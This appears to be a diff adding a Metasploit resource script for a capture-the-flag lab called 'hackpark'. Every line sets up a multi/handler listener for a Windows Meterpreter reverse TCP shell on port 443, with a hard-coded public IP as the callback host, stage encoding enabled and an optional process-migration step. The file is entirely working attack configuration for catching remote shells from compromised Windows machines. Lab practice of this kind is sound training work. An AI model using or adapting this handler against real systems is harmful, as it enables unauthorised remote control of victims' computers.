@@ -1,0 +1,11 @@
+#
+# [Kali]: msfdb start; msfconsole -q -r '/hackme/windows/hackpark/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
+#
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 73.7.18.47
+set LPORT 443
+set ExitOnSession false
+set EnableStageEncoding true
+#set AutoRunScript 'post/windows/manage/migrate'
+run -j
